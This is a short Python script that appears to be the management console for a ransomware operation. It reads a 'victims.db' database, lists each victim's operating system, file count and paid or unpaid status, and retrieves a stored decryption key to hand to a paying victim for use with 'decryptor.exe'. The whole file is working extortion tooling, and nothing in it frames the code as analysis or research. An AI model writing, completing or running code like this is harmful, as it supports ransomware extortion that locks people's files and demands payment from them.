
import sqlite3

def list_victims():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("SELECT * FROM victims")
    victims = c.fetchall()
    conn.close()
    
    print("\n" + "="*60)
    print("🎯 VICTIM MANAGEMENT")
    print("="*60)
    
    for v in victims:
        status = "✅ PAID" if v[5] else "❌ UNPAID"
        print(f"\nID: {v[0]}")
        print(f"  OS: {v[2]} | Files: {v[3]}")
        print(f"  Status: {status}")
        print(f"  Time: {v[6]}")
    
    print("\n" + "="*60)

def decrypt_file_for_victim(victim_id):
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("SELECT key FROM victims WHERE id=?", (victim_id,))
    result = c.fetchone()
    conn.close()
    
    if result:
        print(f"\n🔑 Decryption key for {victim_id}:")
        print("-"*50)
        print(result[0])
        print("-"*50)
        print("\nGive this key to the victim to use with decryptor.exe")
    else:
        print(f"Victim {victim_id} not found")

if __name__ == "__main__":
    list_victims()
    
    victim_id = input("\nEnter victim ID to get decryption key (or press Enter to skip): ")
    if victim_id:
        decrypt_file_for_victim(victim_id)